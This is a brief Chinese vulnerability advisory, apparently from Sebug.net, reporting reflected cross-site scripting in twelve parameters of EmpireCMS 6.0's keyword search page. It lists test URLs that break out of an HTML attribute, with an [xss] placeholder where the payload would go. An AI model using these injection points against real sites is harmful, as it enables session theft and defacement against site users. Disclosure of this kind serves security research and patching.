@@ -1,0 +1,6 @@
+帝国（EmpireCMS）6.0 /search/keyword/index.php 存在多个跨站漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://ssvdb.com/search/keyword/index.php?show=3">[xss]2.http://ssvdb.com/search/keyword/index.php?classid=3">[xss]3.http://ssvdb.com/search/keyword/index.php?tbname=3">[xss]4.http://ssvdb.com/search/keyword/index.php?tempid=3">[xss]5.http://ssvdb.com/search/keyword/index.php?starttime=3">[xss]6.http://ssvdb.com/search/keyword/index.php?endtime=3">[xss]7.http://ssvdb.com/search/keyword/index.php?startprice=3">[xss]8.http://ssvdb.com/search/keyword/index.php?endprice=3">[xss]9.http://ssvdb.com/search/keyword/index.php?orderby=3">[xss]10.http://ssvdb.com/search/keyword/index.php?myorder=3">[xss]11.http://ssvdb.com/search/keyword/index.php?keyboard=3">[xss]12.http://ssvdb.com/search/keyword/index.php?allsame=3">[xss]
